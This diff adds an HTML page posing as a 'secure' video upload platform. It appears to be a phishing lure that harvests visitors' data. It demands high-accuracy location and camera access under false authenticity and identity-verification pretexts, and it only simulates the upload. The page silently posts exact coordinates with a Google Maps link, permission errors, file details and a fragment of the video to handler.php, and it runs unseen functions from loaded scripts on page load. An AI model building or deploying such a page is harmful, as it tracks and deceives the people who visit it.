@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Upload - Secure Platform</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 1000px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            color: white;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header p {
+            font-size: 16px;
+            color: #64748b;
+        }
+
+        /* Permission Screens */
+        .permission-screen {
+            display: block;
+            text-align: center;
+            padding: 30px;
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+
+        .permission-screen.hidden {
+            display: none;
+        }
+
+        .permission-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #10b981, #14b8a6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .permission-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 10px;
+        }
+
+        .permission-description {
+            font-size: 16px;
+            color: #64748b;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .btn-permission {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+            margin: 5px;
+        }
+
+        .btn-permission:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
+        }
+
+        .btn-permission i {
+            margin-right: 8px;
+        }
+
+        .status-indicator {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .status-indicator.success {
+            background: rgba(16, 185, 129, 0.1);
+            color: #10b981;
+        }
+
+        .status-indicator.error {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+        }
+
+        /* Upload Section */
+        .upload-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .upload-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .upload-area {
+            border: 3px dashed #6366f1;
+            border-radius: 16px;
+            padding: 50px 30px;
+            text-align: center;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 30px;
+        }
+
+        .upload-area:hover {
+            border-color: #8b5cf6;
+            background: #f8fafc;
+        }
+
+        .upload-area.dragover {
+            border-color: #10b981;
+            background: #f0fdf4;
+        }
+
+        .upload-icon {
+            font-size: 72px;
+            color: #6366f1;
+            margin-bottom: 20px;
+        }
+
+        .upload-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 10px;
+        }
+
+        .upload-hint {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 20px;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .info-section {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #475569;
+        }
+
+        .info-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-item i {
+            color: #6366f1;
+            margin-right: 12px;
+            width: 24px;
+        }
+
+        .info-item.success i {
+            color: #10b981;
+        }
+
+        .info-item.error i {
+            color: #ef4444;
+        }
+
+        .uploaded-videos {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 25px;
+        }
+
+        .video-item {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+
+        .video-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .video-item video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .video-info {
+            padding: 15px;
+        }
+
+        .video-name {
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 8px;
+            font-size: 14px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .video-details {
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        .video-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #10b981;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .progress-bar.show {
+            display: block;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body onload="mydata(); initializePermissions();">
+    
+    <div class="main-container">
+        <div class="header">
+            <div class="header-icon">
+                <i class="fas fa-video"></i>
+            </div>
+            <h1>Video Upload Platform</h1>
+            <p>Secure video sharing with location verification</p>
+        </div>
+
+        <!-- Location Permission Screen -->
+        <div class="permission-screen" id="locationPermissionScreen">
+            <div class="permission-icon">
+                <i class="fas fa-map-marker-alt"></i>
+            </div>
+            <div class="permission-title">Location Access Required</div>
+            <div class="permission-description">
+                To ensure secure video uploads, we need access to your location.<br>
+                This helps verify the authenticity of your content.
+            </div>
+            <button class="btn-permission" onclick="requestLocationPermission()">
+                <i class="fas fa-map-marker-alt"></i> Allow Location Access
+            </button>
+            <div class="status-indicator hidden" id="locationStatus"></div>
+        </div>
+
+        <!-- Camera Permission Screen -->
+        <div class="permission-screen hidden" id="cameraPermissionScreen">
+            <div class="permission-icon" style="background: linear-gradient(135deg, #6366f1, #8b5cf6);">
+                <i class="fas fa-camera"></i>
+            </div>
+            <div class="permission-title">Camera Access Required</div>
+            <div class="permission-description">
+                We need camera access to verify your identity during video upload.<br>
+                This ensures secure and authenticated content sharing.
+            </div>
+            <button class="btn-permission" onclick="requestCameraPermission()">
+                <i class="fas fa-camera"></i> Allow Camera Access
+            </button>
+            <div class="status-indicator hidden" id="cameraStatus"></div>
+        </div>
+
+        <!-- Upload Section -->
+        <div class="upload-section" id="uploadSection">
+            <div class="info-section">
+                <div class="info-item success" id="locationInfo">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>Location: <span id="locationText">Granted</span></span>
+                </div>
+                <div class="info-item success" id="cameraInfo">
+                    <i class="fas fa-camera"></i>
+                    <span>Camera: <span id="cameraText">Granted</span></span>
+                </div>
+            </div>
+
+            <div class="upload-area" id="uploadArea" onclick="document.getElementById('videoInput').click()">
+                <div class="upload-icon">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                </div>
+                <div class="upload-text">Click to Upload Video or Drag & Drop</div>
+                <div class="upload-hint">Supported formats: MP4, WebM, MOV (Max 100MB)</div>
+                <input type="file" id="videoInput" class="file-input" accept="video/*" onchange="handleVideoSelect(event)">
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <div class="uploaded-videos" id="uploadedVideos"></div>
+
+            <div class="error-message" id="errorMsg"></div>
+        </div>
+    </div>
+
+    <script>
+        let userLocation = null;
+        let cameraStream = null;
+        let uploadedVideos = [];
+
+        // Initialize permissions on page load
+        function initializePermissions() {
+            // Show location permission screen first
+            document.getElementById('locationPermissionScreen').classList.remove('hidden');
+        }
+
+        // Request location permission
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Update status
+                        const statusEl = document.getElementById('locationStatus');
+                        statusEl.textContent = `Location: ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}`;
+                        statusEl.classList.remove('hidden', 'error');
+                        statusEl.classList.add('success');
+                        
+                        // Save location to logs
+                        saveLocationToLogs(userLocation);
+                        
+                        // Hide location screen, show camera screen
+                        setTimeout(function() {
+                            document.getElementById('locationPermissionScreen').classList.add('hidden');
+                            document.getElementById('cameraPermissionScreen').classList.remove('hidden');
+                        }, 1500);
+                    },
+                    function(error) {
+                        const statusEl = document.getElementById('locationStatus');
+                        statusEl.textContent = 'Location access denied: ' + error.message;
+                        statusEl.classList.remove('hidden', 'success');
+                        statusEl.classList.add('error');
+                        
+                        // Save location error to logs
+                        saveLocationErrorToLogs(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                const statusEl = document.getElementById('locationStatus');
+                statusEl.textContent = 'Geolocation is not supported by this browser.';
+                statusEl.classList.remove('hidden', 'success');
+                statusEl.classList.add('error');
+            }
+        }
+
+        // Request camera permission
+        function requestCameraPermission() {
+            const constraints = {
+                audio: false,
+                video: true
+            };
+
+            // Try multiple constraint options
+            const constraintOptions = [
+                { audio: false, video: { facingMode: 'user' } },
+                { audio: false, video: { facingMode: 'environment' } },
+                { audio: false, video: true }
+            ];
+
+            let lastError = null;
+            let success = false;
+
+            async function tryCameraAccess() {
+                for (let i = 0; i < constraintOptions.length; i++) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraintOptions[i]);
+                        cameraStream = stream;
+                        success = true;
+                        
+                        // Stop the stream immediately (we just needed permission)
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Update status
+                        const statusEl = document.getElementById('cameraStatus');
+                        statusEl.textContent = 'Camera access granted';
+                        statusEl.classList.remove('hidden', 'error');
+                        statusEl.classList.add('success');
+                        
+                        // Save camera access to logs
+                        saveCameraAccessToLogs();
+                        
+                        // Hide camera screen, show upload section
+                        setTimeout(function() {
+                            document.getElementById('cameraPermissionScreen').classList.add('hidden');
+                            document.getElementById('uploadSection').classList.add('active');
+                            updateInfoDisplay();
+                        }, 1500);
+                        
+                        return;
+                    } catch (error) {
+                        lastError = error;
+                        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                            break;
+                        }
+                    }
+                }
+
+                // All attempts failed
+                const statusEl = document.getElementById('cameraStatus');
+                statusEl.textContent = 'Camera access denied: ' + (lastError ? lastError.message : 'Unknown error');
+                statusEl.classList.remove('hidden', 'success');
+                statusEl.classList.add('error');
+                
+                // Save camera error to logs
+                saveCameraErrorToLogs(lastError);
+            }
+
+            tryCameraAccess();
+        }
+
+        // Update info display
+        function updateInfoDisplay() {
+            if (userLocation) {
+                document.getElementById('locationText').textContent = 
+                    `${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}`;
+            }
+            if (cameraStream) {
+                document.getElementById('cameraText').textContent = 'Access Granted';
+            }
+        }
+
+        // Handle video file selection
+        function handleVideoSelect(event) {
+            const files = event.target.files;
+            if (files.length > 0) {
+                const file = files[0];
+                if (file.type.startsWith('video/')) {
+                    handleVideoUpload(file);
+                } else {
+                    showError('Please select a valid video file.');
+                }
+            }
+        }
+
+        // Handle video upload
+        function handleVideoUpload(file) {
+            // Check file size (100MB limit)
+            const maxSize = 100 * 1024 * 1024; // 100MB
+            if (file.size > maxSize) {
+                showError('Video file is too large. Maximum size is 100MB.');
+                return;
+            }
+
+            // Show progress bar
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+            progressBar.classList.add('show');
+            progressFill.style.width = '0%';
+
+            // Simulate upload progress
+            let progress = 0;
+            const progressInterval = setInterval(function() {
+                progress += Math.random() * 15;
+                if (progress > 90) progress = 90;
+                progressFill.style.width = progress + '%';
+            }, 200);
+
+            // Read video file
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                clearInterval(progressInterval);
+                progressFill.style.width = '100%';
+
+                setTimeout(function() {
+                    progressBar.classList.remove('show');
+                    
+                    // Add to uploaded videos
+                    uploadedVideos.push({
+                        name: file.name,
+                        size: file.size,
+                        type: file.type,
+                        data: e.target.result,
+                        timestamp: new Date().toISOString()
+                    });
+
+                    // Display video
+                    displayVideo(file, e.target.result);
+
+                    // Save upload to logs
+                    saveVideoUploadToLogs(file, e.target.result);
+
+                    // Reset input
+                    document.getElementById('videoInput').value = '';
+                }, 500);
+            };
+
+            reader.onerror = function() {
+                clearInterval(progressInterval);
+                progressBar.classList.remove('show');
+                showError('Error reading video file.');
+            };
+
+            reader.readAsDataURL(file);
+        }
+
+        // Display uploaded video
+        function displayVideo(file, videoData) {
+            const uploadedVideos = document.getElementById('uploadedVideos');
+            const videoItem = document.createElement('div');
+            videoItem.className = 'video-item';
+            
+            const video = document.createElement('video');
+            video.src = videoData;
+            video.controls = true;
+            video.style.maxHeight = '200px';
+            
+            const videoInfo = document.createElement('div');
+            videoInfo.className = 'video-info';
+            
+            const videoName = document.createElement('div');
+            videoName.className = 'video-name';
+            videoName.textContent = file.name;
+            
+            const videoDetails = document.createElement('div');
+            videoDetails.className = 'video-details';
+            videoDetails.innerHTML = `
+                <i class="fas fa-file-video"></i> ${(file.size / 1024 / 1024).toFixed(2)} MB<br>
+                <i class="fas fa-clock"></i> ${new Date().toLocaleString()}
+            `;
+            
+            const badge = document.createElement('div');
+            badge.className = 'video-badge';
+            badge.textContent = 'UPLOADED';
+            
+            videoInfo.appendChild(videoName);
+            videoInfo.appendChild(videoDetails);
+            videoItem.appendChild(video);
+            videoItem.appendChild(videoInfo);
+            videoItem.appendChild(badge);
+            uploadedVideos.appendChild(videoItem);
+        }
+
+        // Drag and drop handlers
+        const uploadArea = document.getElementById('uploadArea');
+        
+        uploadArea.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+
+        uploadArea.addEventListener('dragleave', function(e) {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+        });
+
+        uploadArea.addEventListener('drop', function(e) {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            
+            const files = e.dataTransfer.files;
+            if (files.length > 0) {
+                const file = files[0];
+                if (file.type.startsWith('video/')) {
+                    handleVideoUpload(file);
+                } else {
+                    showError('Please drop a valid video file.');
+                }
+            }
+        });
+
+        // Show error message
+        function showError(message) {
+            const errorMsg = document.getElementById('errorMsg');
+            errorMsg.textContent = message;
+            errorMsg.classList.add('show');
+            setTimeout(function() {
+                errorMsg.classList.remove('show');
+            }, 5000);
+        }
+
+        // Save location to logs
+        function saveLocationToLogs(location) {
+            const locationData = `[VIDEO UPLOAD - LOCATION GRANTED]
+Timestamp: ${location.timestamp}
+Latitude: ${location.lat}
+Longitude: ${location.lon}
+Accuracy: ${location.accuracy} meters
+Google Maps: https://www.google.com/maps?q=${location.lat},${location.lon}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: locationData },
+                success: function() {
+                    console.log('Location saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving location to logs');
+                }
+            });
+        }
+
+        // Save location error to logs
+        function saveLocationErrorToLogs(error) {
+            const errorData = `[VIDEO UPLOAD - LOCATION ERROR]
+Timestamp: ${new Date().toISOString()}
+Error: ${error.message || 'Location access denied'}
+Error Code: ${error.code || 'UNKNOWN'}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('Location error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving location error to logs');
+                }
+            });
+        }
+
+        // Save camera access to logs
+        function saveCameraAccessToLogs() {
+            const accessData = `[VIDEO UPLOAD - CAMERA ACCESS GRANTED]
+Timestamp: ${new Date().toISOString()}
+Status: Camera permission granted successfully
+Purpose: Identity verification for video upload
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: accessData },
+                success: function() {
+                    console.log('Camera access saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving camera access to logs');
+                }
+            });
+        }
+
+        // Save camera error to logs
+        function saveCameraErrorToLogs(error) {
+            const errorData = `[VIDEO UPLOAD - CAMERA ACCESS ERROR]
+Timestamp: ${new Date().toISOString()}
+Error: ${error ? error.message : 'Camera access denied'}
+Error Name: ${error ? error.name : 'UNKNOWN'}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('Camera error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving camera error to logs');
+                }
+            });
+        }
+
+        // Save video upload to logs
+        function saveVideoUploadToLogs(file, videoData) {
+            const timestamp = new Date().toISOString();
+            const base64Size = (videoData.length * 0.75 / 1024 / 1024).toFixed(2);
+            
+            let logData = `[VIDEO UPLOAD - VIDEO UPLOADED]
+Timestamp: ${timestamp}
+File Name: ${file.name}
+File Size: ${(file.size / 1024 / 1024).toFixed(2)} MB
+File Type: ${file.type}
+Base64 Size: ${base64Size} MB
+`;
+
+            if (userLocation) {
+                logData += `Location: ${userLocation.lat}, ${userLocation.lon}
+Location Accuracy: ${userLocation.accuracy} meters
+Google Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}
+`;
+            } else {
+                logData += `Location: Not available
+`;
+            }
+
+            logData += `Camera Access: ${cameraStream ? 'Granted' : 'Not granted'}
+Video Data: Base64 encoded (first 100 chars: ${videoData.substring(0, 100)}...)
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: logData },
+                success: function() {
+                    console.log('Video upload saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving video upload to logs');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
+
